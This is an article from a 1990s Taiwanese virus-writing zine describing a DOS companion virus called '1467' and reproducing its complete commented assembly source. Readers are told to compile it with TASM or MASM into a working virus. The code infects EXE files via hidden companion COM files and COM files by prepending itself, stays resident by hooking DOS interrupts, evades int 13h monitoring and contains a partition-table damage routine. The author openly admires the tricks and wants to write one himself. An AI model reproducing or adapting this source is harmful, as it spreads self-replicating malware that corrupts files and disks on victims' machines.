
               ☆ ＴＰＶＯ病毒雜誌  第００１期  TPVO-001.005 ☆

                      ◎台灣第一隻伴隨型病毒(解析)◎
                          by Dark Slayer of TPVO

        ==============================================================

            有一種特殊的檔案型病毒，其感染方式有別於一般的檔案型病毒，
        利用COM 檔執行順序優先於EXE 檔的特性，對於要感染的EXE 檔在同一
        目錄下，造出檔名相同但副檔名為COM 的病毒本體，當要執行這個EXE
        檔時，在Command 的命令列打這個EXE 檔的主檔名，卻不知同檔名的COM
        病毒檔已經被執行了，此COM 檔會再載入原來的EXE 檔，造成你的不知
        不覺，以為一切都很正常。

            利用這種怪招寫出來的毒，我們稱它為「伴隨型」病毒(Companion
        Virus)，第一隻採用這種感染方式的毒為「AIDS II」，為老外寫的(為
        什麼老外有這麼多創意呢？國人該加油囉) ，大概此毒作者有意讓大家
        知道他發明了一種新的感染方式，故此毒根本不隱藏，並且一執行便發
        作。

            對於這種感染方式，國內的病毒作者尚未廣泛的使用，但在國外，
        早就有一「脫拉褲」病毒採用這種感染方式，第一屆國際電腦病毒寫作
        大賽的冠軍即是「伴隨型」病毒。

        我想此類型病毒之所以如此的受到老外的喜愛, 原因有三個：

         1) 感染方法簡單：這類型病毒只要造出COM 伴隨檔 (病毒本體) 就OK
                了, 寫作方法極為簡單

         2) 隱藏性：具自我偵毒能力的檔案，即使被感染也不自知，因為根本
                就沒有修改到該執行檔，即使想在同一目錄下找出同檔名的
                COM 檔，只要稍加一點技巧即可騙過。

         3) 亦可利用高階語言：由於它的感染方式簡單，所以利用高階語言一
                樣可以輕易的寫出來。

            最近國內終於發現此類病毒的蹤跡，是我們可愛的 Ghost Shadow
        在他學校(聯合工專)的宿舍發現的，猜想作者大概也是聯合的學生吧！
        此毒應該是台灣第一隻真正流傳出來的伴隨型病毒 (自己寫好玩，作實
        驗而沒有放出來的不算) ，其特性如下：

        病毒名稱：1467 (找不到別的特徵可作為病毒名稱)
        病毒來源：台灣 (聯合工專)
        病毒作者：Jimmy Sad (Dark Tommy)
        發現日期：1995年03月Ｘ日
        病毒長度：1467 bytes
        發作情形：每年的06月22日一執行病毒便發作，發作時會顯示訊息，在
                  沒有常駐中文系統或是有常駐中文系統但是在英文模式下，
                  則顯示"Happy Birthday !"，否則顯示"祝佩芳生日快樂！"
                  ，大概是此毒作者為女朋友而寫的吧？！
        病毒特性：為每個要感染的EXE 檔造出同檔名的COM 隱藏檔，為「伴隨
                  型」病毒，此毒也會感染COM 檔，利用傳統的感染方式。

        病毒剖析：此毒為「伴隨型」病毒，但也會使用傳統方式感染COM 檔，
                  當病毒本體 (COM 檔) 被執行時，會先判斷是否已經常駐一
                  份病毒；若無，則先行常駐，然後判斷被感染的檔案為COM
                  或EXE ，若為COM 則將緊接在病毒後面的原COM 程式碼搬移
                  到 PSP:100h ，再 return 至 PSP:100h 執行原COM 程式，
                  若被感染 (或者該說 "被伴隨" ) 的是EXE 檔，則會執行該
                  EXE 檔，更奸的是... 若是執行EXE 檔失敗 (表示此EXE 檔
                  已不存在，或別的錯誤 ), 則此毒會刪掉伴隨檔(COM) ，並
                  且顯示 "Bad command or file name" ，以達到模擬真實情
                  況，讓你中的不知不覺 (哇... 太 "干" 了 )，嗯... 這一
                  點夠巧妙，我就沒想到，改天寫隻玩玩。

                  在突破防寫方面，此毒會利用 ax = 1300h int 2fh 來取得
                  int 13h 原始進入點，只是現今的防毒程式大都有防這一招

                  值得一提的是，此毒在02月06日會讀取Partition table，
                  並在記憶體中將 '55AA' 改成 206h ，但是，之後它又將
                  Partition table 讀進來一次就著實令人費解了，猜想可能
                  是個 Bug，該毒作者本來是想趕在「米開」的306 之前一個
                  月毀掉硬碟 (只是要救回實在太簡單了) ，但是將第二步的
                  回寫動作誤寫成讀取動作，由此看來... 此毒作者並不是那
                  麼仁慈的。

            此毒的source code 以及註解如下，請利用 TASM 或 MASM 編譯即
        可得到可執行的病毒程式碼。

================================ Begin 1467.ASM ==============================

vir_size        equ     offset vir_end-offset start
psp_size        equ     100h
mem_size        equ     vir_size+psp_size
mark            equ     202h
                .286
                .model  small
                .code
                assume  cs:_text,ds:_text
                org     100h
start:
                jmp     vir_start

com_first_2byte dw      ?

alloc_strategy  db      ?
um_link_flag    db      ?
memory_set_flag db      ?                       ; 0: 未設置，1: 已設置

vir_seg         dw      ?
mcb_name        db      'LoadHigh'
old21           dw      ?,?
_0_3c4          dw      3c4h,0

int13_set_flag  db      ?                       ; 0: 未設置，1: 已設置
bios_int13      dw      ?,?
old13           dw      ?,?

file_size       dw      ?
f4b00_file_name dw      ?,?
file_handle     dw      ?
memory_seg      dw      ?
vir_mark        dw      mark

file_attribute  dw      ?
file_date       dw      ?
file_time       dw      ?
attrib_set_flag db      ?                       ; 0: 未設置，1: 已設置

file_type       db      1                       ; 0: COM，1: EXE
file_name       db      32h dup(?)
pcb             dw      ?,?,?,?,?,?,?
                db      12 dup(?)
my_ss           dw      ?
my_sp           dw      ?
env_file_name   dw      ?
bad_msg         db      'Bad command or file name',0ah,0dh,'$'

msg             label   byte
                ; 'Happy Birthday !'
english_msg     db      3eh,57h,66h,66h,6fh,16h,38h,5fh
                db      68h,6ah,5eh,5ah,57h,6fh,16h,17h
                db      0,3h,0fdh,1ah

                ; '祝佩芳生日快樂！'
chinese_msg     db      0a5h,0a2h,9eh,0ceh,0a0h,0d0h,9bh,0c3h
                db      9ah,0dfh,9dh,0cch,0b2h,0cch,97h,3fh
                db      0,3h,0fdh,1ah

                db      0f6h                    ; 訊息結束記號

vir_int24:      ; 抑制錯誤訊息
                xor     ax,ax
                iret

vir_int21:
                cmp     ax,0ffffh               ; 常駐辨認？
                jne     _not_me                 ; 如果不是則 jump
                cmp     cx,1234h                ; 常駐辨認？
                jne     _not_me                 ; 如果不是則 jump
                mov     ax,cx
                iret

_not_me:
                cmp     ax,0feeeh               ; 執行原 COM 檔？
                jne     not_execute_com         ; 如果不是則 jump
                cmp     dx,1234h                ; 執行原 COM 檔？
                jne     not_execute_com         ; 如果不是則 jump
                mov     es,bx
                mov     ds,bx                   ; es = ds = bx = PSP
                mov     si,offset vir_end
                mov     di,100h
                cld                             ; 將接在病毒尾的原 COM 檔程式
                rep     movsb                   ; 碼搬至 PSP:100h
                pop     bx
                mov     bx,100h         ; 將 iret 返回位址改為 PSP:100h
                push    bx
                xor     ax,ax                   ; 清除暫存器
                mov     bx,ax
                mov     cx,ax
                mov     dx,ax
                mov     si,ax
                mov     di,ax
                iret                            ; 執行原 COM 檔

not_execute_com:
                cmp     ax,4b00h                ; 執行檔案？
                je      infect                  ; 如果是則 jump (感染)
                jmp     i21_exit                ; 都不是則跳出

infect:         ; 感染檔案
                pusha
                push    ds
                push    es
                pushf

                xor     ax,ax
                mov     cs:memory_seg,ax        ; 清除變數 (=0)
                mov     cs:file_handle,ax
                mov     cs:attrib_set_flag,al
                mov     cs:int13_set_flag,al

                mov     cs:f4b00_file_name[2],ds        ; 保存檔名位址
                mov     cs:f4b00_file_name,dx

                mov     si,dx
                mov     di,offset file_name
_move_file_name:
                mov     al,ds:[si]              ; 將主檔名 (也就是 '.' 之前的
                mov     cs:[di],al              ; 字元) copy 至 file_name
                inc     si
                inc     di
                cmp     al,'.'
                jne     _move_file_name

                mov     al,ds:[si]              ; al = 副檔名的第一個字元
                and     al,11011111b            ; 小寫變大寫
                cmp     al,'C'                  ; al = 'C'？ (COM)
                je      infect_com              ; 如果是則 jump
                cmp     al,'E'                  ; al = 'E'？ (EXE)
                je      infect_exe              ; 如果是則 jump
                jmp     infect_exit             ; 都不是則跳出

infect_exe:     ; 感染 (或者叫 '伴隨') EXE 檔
                mov     byte ptr cs:[di],'C'    ; 將 EXE 副檔改為 COM
                mov     byte ptr cs:[di+1],'O'
                mov     byte ptr cs:[di+2],'M'
                mov     byte ptr cs:[di+3],0

                push    cs
                pop     ds
                mov     dx,offset vir_int24
                mov     ax,2524h
                int     21h                     ; 設 int 24h，使不發出錯誤訊息

                mov     dx,offset file_name
                mov     ax,3d00h
                int     21h                     ; 開啟伴隨檔 (COM 檔)
                jc      com_not_exist           ; cf = 1 = error 表示伴隨檔
                                                ; 不存在 (未感染過)，則 jump
                jmp     infect_exit             ; 伴隨檔已存在，jump 出去
com_not_exist:
                mov     byte ptr cs:int13_set_flag,1    ; =1 表示設置過 int 13h
                call    set_int13               ; 設 int 13h 到原始進入點

                mov     byte ptr cs:file_type,1 ; file_type = 1 (EXE 檔)

                mov     dx,offset file_name
                mov     cx,22h                  ; 檔案屬性 22h = 隱藏
                mov     ah,3ch
                int     21h                     ; 建立新檔 (COM 伴隨檔)
                jc      err1

                mov     bx,ax
                mov     cx,vir_size
                mov     dx,100h
                mov     ah,40h
                int     21h                     ; 寫入病毒

                mov     ah,3eh
                int     21h                     ; 關檔
                jmp     infect_exit             ; EXE 檔感染完成，jump

infect_com:     ; 感染 COM 檔
                push    cs
                pop     ds

                mov     byte ptr cs:file_type,0 ; file_type = 0 (COM 檔)

                mov     dx,offset vir_int24
                mov     ax,2524h
                int     21h                     ; 設 int 24h，使不發出錯誤訊息

                mov     ds,cs:f4b00_file_name[2]
                mov     dx,cs:f4b00_file_name
                mov     ax,4300h
                int     21h                     ; 取得檔案屬性
err1:
                jc      err2
                mov     cs:file_attribute,cx    ; 保存起來

                mov     dx,cs:f4b00_file_name
                mov     ds,cs:f4b00_file_name[2]
                mov     ax,3d00h
                int     21h                     ; 開檔 (唯讀模式)
                jc      err2
                mov     cs:file_handle,ax

                mov     bx,cs:file_handle
                mov     ax,5700h
                int     21h                     ; 取檔案時間日期
                jc      err2
                mov     cs:file_time,cx         ; 保存起來
                mov     cs:file_date,dx

                mov     bx,cs:file_handle
                mov     ax,4202h
                xor     cx,cx
                mov     dx,cx
                int     21h                     ; 移動讀寫指標至檔尾
                jc      err2
                mov     cs:file_size,ax         ; ax = 檔案長度，保存起來

                cmp     ax,1000d                ; 檔案長度 < 1000
                jb      err2                    ; 如果是則 jump
                cmp     ax,10000d               ; 檔案長度 <= 10000
                jbe     file_len_chk_ok         ; 如果是則 jump (符合條件)

                jmp     close_file              ; jump (不感染)
file_len_chk_ok:
                mov     bx,ax
                mov     cl,4
                shr     bx,cl
                inc     bx
                mov     ah,48h
                int     21h                     ; 配置記憶體
                jc      err2
                mov     cs:memory_seg,ax        ; 保存此記憶體區段

                mov     bx,cs:file_handle
                mov     ax,4200h
                xor     cx,cx
                mov     dx,cx
                int     21h                     ; 移動讀寫指標至檔頭
err2:
                jc      err4

                mov     ds,cs:memory_seg
                xor     dx,dx
                mov     bx,cs:file_handle
                mov     cx,cs:file_size
                mov     ah,3fh
                int     21h                     ; 將整個檔案讀至剛配置的記憶體
                jc      err3

                xor     si,si
                mov     ax,ds:[si]              ; 取此 COM 檔的前兩個 bytes
                mov     cs:com_first_2byte,ax   ; 保存起來
                mov     word ptr ds:[si],19cdh  ; 將前兩個 bytes 改為 int 19h

                mov     bx,cs:file_handle
                mov     ah,3eh
                int     21h                     ; 關檔
err3:
                jc      err4

                mov     si,offset vir_mark-100h
                cmp     word ptr ds:[si],mark   ; 比較此 COM 檔是否已經感染過？
                je      close_file              ; 如果是則 jump

                mov     byte ptr cs:int13_set_flag,1    ; =1 表示設置過 int 13h
                call    set_int13               ; 設 int 13h 到原始進入點

                mov     ds,cs:f4b00_file_name[2]
                mov     dx,cs:f4b00_file_name
                mov     ax,4301h
                mov     cx,20h
                int     21h                     ; 改檔案屬性為一般
err4:
                jc      err5
                mov     byte ptr cs:attrib_set_flag,1   ; =1 表示設置過檔案屬性

                mov     dx,cs:f4b00_file_name
                mov     ds,cs:f4b00_file_name[2]
                mov     ax,3d01h
                int     21h                     ; 開檔 (唯寫模式)
                jc      close_file
                mov     cs:file_handle,ax

                push    cs
                pop     ds
                mov     dx,100h
                mov     bx,cs:file_handle
                mov     cx,vir_size
                mov     ah,40h
                int     21h                     ; 將病毒寫至檔案開頭
err5:
                jc      close_file

                mov     ds,cs:memory_seg
                xor     dx,dx
                mov     bx,cs:file_handle
                mov     cx,cs:file_size
                mov     ah,40h                  ; 將原 COM 檔程式碼接著病毒尾
                int     21h                     ; 寫入
                jc      close_file

                mov     bx,cs:file_handle
                mov     ax,5701h
                mov     cx,cs:file_time
                mov     dx,cs:file_date
                int     21h                     ; 恢復原來的時間日期
                jc      close_file

close_file:
                mov     bx,cs:file_handle
                mov     ah,3eh
                int     21h                     ; 關檔

                mov     es,cs:memory_seg
                mov     ah,49h
                int     21h                     ; 釋放所配置的記憶體

                cmp     byte ptr cs:attrib_set_flag,0   ; 是否設置過檔案屬性
                je      infect_exit                     ; 如果沒有則 jump
                mov     ds,cs:f4b00_file_name[2]
                mov     dx,cs:f4b00_file_name
                mov     ax,4301h
                mov     cx,cs:file_attribute
                int     21h                     ; 恢復原先的屬性
infect_exit:

                cmp     byte ptr cs:int13_set_flag,0    ; 是否設置過 int 13h
                je      dont_restore_int13              ; 如果沒有則 jump
                call    restore_int13           ; 恢復原先的 int 13h

dont_restore_int13:
                popf
                pop     es
                pop     ds
                popa
i21_exit:
                jmp     dword ptr cs:old21      ; jump 至原 int 21h


set_int13:      ; 設 int 13h 到原始進入點
                mov     ax,3513h
                int     21h                     ; 取目前的 int 13h
                mov     cs:old13,bx             ; 保存起來
                mov     cs:old13[2],es

                mov     dx,cs:bios_int13
                mov     ds,cs:bios_int13[2]
                mov     ax,2513h
                int     21h                     ; 將 int 13h 設到原始進入點

                push    cs
                pop     ds
                ret

restore_int13:  ; 恢復原先的 int 13h
                mov     dx,cs:old13
                mov     ds,cs:old13[2]
                mov     ax,2513h
                int     21h
                ret

vir_start:
                mov     ax,cs:com_first_2byte   ; 恢復 COM 檔前兩個 bytes
                mov     si,offset vir_end
                mov     ds:[si],ax

                mov     ax,0ffffh
                mov     cx,1234h
                int     21h
                cmp     ax,1234h                ; 是否已經常駐？
                jne     not_me                  ; 如果沒有則 jump

                cmp     byte ptr cs:file_type,0 ; 被感染的為 COM 檔？
                je      execute_com             ; 如果是則 jump
                jmp     execute_exe             ; 否則執行 EXE 檔

execute_com:
                mov     cx,cs:file_size         ; 原 COM 檔長
                mov     bx,cs
                mov     ax,0feeeh               ; 0feeeh -> 告訴記憶體中的毒，
                mov     dx,1234h                ;           要執行原 COM 檔
                int     21h

not_me:
                mov     ah,13h
                int     2fh                     ; 取 int 13h 原始進入點
                mov     cs:bios_int13,dx
                mov     cs:bios_int13[2],ds
                int     2fh

                mov     ah,2ah
                int     21h                     ; 取日期
                cmp     dx,206h                 ; 2 月 6 日?
                jne     not_today               ; 如果不是則 jump

                call    set_int13               ; 設 int 13h 到原始進入點

                mov     ax,cs
                mov     ds,ax
                mov     es,ax

                mov     ax,201h
                mov     cx,1
                mov     dx,80h
                mov     bx,offset vir_end
                int     13h                     ; 讀取硬碟分割表
                jc      not_today

                mov     si,offset vir_end+1feh  ; si 指向分割表中的 55 AA
                mov     word ptr ds:[si],206h   ; 將 55 AA 改成 206

                mov     ax,203h                 ; ax = 203h ？！
                mov     cx,1
                mov     dx,80h
                mov     bx,offset vir_end
                int     13h                     ; 再讀一次分割表？why？
                        ; 我猜想可能是 bug，原先的目的應該是在 2 月 6 日毀掉硬
                        ; 碟分割表造成無法開機，可是卻將 ax = 301h 打錯成為
                        ; ax = 203h

                mov     al,7
                int     29h                     ; 嗶一聲

not_today:
                mov     ax,5800h
                int     21h                     ; 取得記憶體配置方法
                jc      set_mem_err1
                mov     cs:alloc_strategy,al    ; 保存起來

                mov     ax,5802h
                int     21h                     ; 取得 UMB 的連接旗標
                jc      set_mem_err1
                mov     cs:um_link_flag,al      ; 保存起來

                mov     ax,5803h
                mov     bx,1
                int     21h                     ; 設定 UMB 的連接旗標 = 1
                                                ; 表示連接主記憶體和 UMB
set_mem_err1:
                jc      set_mem_err2
                mov     byte ptr cs:memory_set_flag,1   ; =1 表示記憶體狀態
                                                        ;    有變更過

                mov     ax,5801h
                mov     bx,40h
                int     21h                     ; 設定記憶體配置方法 = 40h
                                                ; 表示配置記憶體時會從 UMB
                                                ; 由低位址往高位址尋找空間
set_mem_err2:
                jc      set_mem_err3

                mov     bx,mem_size
                shr     bx,4
                inc     bx
                mov     ah,48h
                int     21h             ; 在 UMB 配置一塊記憶體用來常駐
                jc      set_mem_err3
                mov     cs:vir_seg,ax           ; 保存此記憶體的區段

                mov     es,ax
                xor     si,si
                mov     di,si
                mov     cx,mem_size
                cld
                rep     movsb                   ; copy 一份病毒到此記憶體

                mov     ax,es
                dec     ax                      ; ax = es - 1 = MCB
                mov     es,ax                   ; es = MCB
                inc     ax
                mov     es:[1],ax               ; 將此 MCB 設為常駐，不可釋放

                mov     cx,8
                mov     si,offset mcb_name
                mov     di,8
                cld
                rep     movsb                   ; 將 'LoadHigh' 字串 copy
                                                ; 至此 MCB

                mov     es,cs:vir_seg
                mov     word ptr es:[80h],0     ; PSP offset 80h = 參數字串
                                                ; 設為 0

                mov     bl,cs:alloc_strategy
                mov     ax,5801h
                int     21h                     ; 恢復原先的記憶體配置方法

                mov     bl,cs:um_link_flag
                mov     ax,5803h
                int     21h                     ; 恢復原先的 UMB 連接旗標

                mov     ax,3521h
                int     21h                     ; 取得 int 21h 位址
                mov     ds,cs:vir_seg
                mov     ds:old21,bx             ; 保存起來
                mov     ds:old21[2],es

                mov     dx,offset vir_int21
                mov     ax,2521h
                int     21h                     ; 設定 int 21h
                jmp     vir_start               ; 跳至病毒開頭
                        ; 此時因為已經有常駐病毒在記憶體中，故不會重覆常駐
                        ; 而會去執行原檔案

set_mem_err3:
                cmp     byte ptr cs:memory_set_flag,0   ; 記憶體狀態是否有變
                                                        ; 更過？
                je      dont_restore_mem_state          ; 如果沒有則 jump
                                                        ; 不需恢復

                mov     bl,cs:alloc_strategy
                mov     ax,5801h
                int     21h                     ; 恢復原先的記憶體配置方法

                mov     bl,cs:um_link_flag
                mov     ax,5803h
                int     21h                     ; 恢復原先的 UMB 連接旗標

dont_restore_mem_state:
                cmp     byte ptr cs:file_type,0 ; 是 COM 檔嗎？
                jne     execute_exe             ; 如果不是則 jump

                xor     ax,ax
                mov     ds,ax
                mov     si,3c4h                 ; 將 rep movsb、retf
                                                ; 放在 0:3c4h
                mov     byte ptr ds:[si],0f3h   ; code 0f3h = rep
                inc     si
                mov     byte ptr ds:[si],0a4h   ; code 0a4h = movsb
                inc     si
                mov     byte ptr ds:[si],0cbh   ; code 0cbh = retf

                mov     ax,cs
                mov     ds,ax
                mov     es,ax                   ; es = ds = cs = PSP (COM 檔)
                push    cs
                push    100h                    ; retf 至 cs:100h
                mov     cx,cs:file_size
                mov     di,100h                 ; 將原 COM 檔程式碼從病毒尾部
                mov     si,offset vir_end       ; 搬至 cs:100h
                cld
                xor     ax,ax
                xor     bx,bx
                xor     dx,dx
                jmp     dword ptr cs:_0_3c4     ; jump to 0:3c4h

execute_exe:
                mov     ax,cs
                mov     ds,ax
                mov     es,ax

                mov     sp,mem_size+100d        ; 設 sp，堆疊有 100 bytes 可用

                mov     ds,cs:[2ch]             ; 取環境變數區段
                xor     si,si
search_file_name:
                inc     si
                cmp     word ptr ds:[si],0      ; 搜尋檔名
                jne     search_file_name
                add     si,4                    ; si = si + 4，指向程式檔名
                mov     cs:env_file_name,si     ; 保存起來

                mov     di,offset file_name
move_file_name:
                mov     al,ds:[si]              ; 將主檔名 (也就是 '.' 之前的
                mov     es:[di],al              ; 字元) copy 至 file_name
                inc     si
                inc     di
                cmp     al,'.'
                jne     move_file_name

                push    cs
                pop     ds
                mov     byte ptr ds:[di],'E'    ; 將副檔名改為 EXE
                mov     byte ptr ds:[di+1],'X'  ; 因為這是伴隨型病毒，所以 COM
                mov     byte ptr ds:[di+2],'E'  ; 檔 (病毒) 會先被執行，而現在
                mov     byte ptr ds:[di+3],0    ; 要執行原 EXE 檔
                mov     word ptr cs:pcb[2],80h  ; 設定 4b00 的參數控制區 (PCB)
                mov     cs:pcb[4],cs
                mov     word ptr cs:pcb[6],5ch
                mov     cs:pcb[8],cs
                mov     word ptr cs:pcb[10],6ch
                mov     cs:pcb[12],cs

                mov     bx,mem_size+100d
                shr     bx,4
                inc     bx
                mov     ah,4ah
                int     21h                     ; 更動記憶體大小

                mov     bx,offset pcb
                mov     dx,offset file_name
                mov     cs:my_ss,ss             ; 保存 ss:sp
                mov     cs:my_sp,sp
                mov     ax,4b00h
                int     21h                     ; 執行原 EXE 檔

                push    cs
                pop     ds
                cli
                mov     ss,cs:my_ss             ; 恢復 ss:sp
                mov     sp,cs:my_sp
                sti
                jnc     execute_ok              ; 如果 4b00 正確執行則 jump

                mov     ah,41h                  ; 4b00 有錯誤，可能原 EXE 檔已
                mov     ds,cs:[2ch]             ; 經不存在了，所以沒有必要存在
                mov     dx,cs:env_file_name     ; COM 檔 (伴隨)，故將此 COM 檔
                int     21h                     ; 刪除 (delete)

                push    cs
                pop     ds
                mov     dx,offset bad_msg
                mov     ah,9            ; 顯示 'Bad command or file name'
                int     21h             ; 有掩飾的功能

                mov     ah,4ch
                mov     al,1
                int     21h                     ; 程式結束
execute_ok:
                mov     ah,2ah
                int     21h                     ; 取日期
                cmp     dx,616h                 ; 6 月 22 (16h) 日？
                jne     active_done             ; 如果不是則 jump

                mov     si,offset msg
decrypt_loop:
                add     byte ptr ds:[si],0ah    ; 將訊息解碼
                inc     si
                cmp     byte ptr ds:[si],0f6h   ; 訊息結尾？
                jnz     decrypt_loop            ; 如果不是則 jump，繼續解碼

                mov     ax,9100h
                int     10h
                cmp     ax,9100h                ; 有倚天中文系統？
                je      print_eng_msg           ; 如果沒有則 jump
                test    dh,80h                  ; 有常駐中文系統，但是在英文
                                                ; 模式下？
                jnz     print_eng_msg           ; 如果是則 jump

                mov     dx,offset chinese_msg
                mov     ah,9
                int     21h                     ; 顯示中文訊息
                jmp     short active_done
                nop

print_eng_msg:
                mov     dx,offset english_msg
                mov     ah,9h
                int     21h                     ; 顯示英文訊息

active_done:
                mov     ah,4dh
                int     21h                     ; 取子程式的結束碼

                mov     ah,4ch
                int     21h                     ; 程式結束
vir_end:
                end     start

================================= End 1467.ASM ===============================
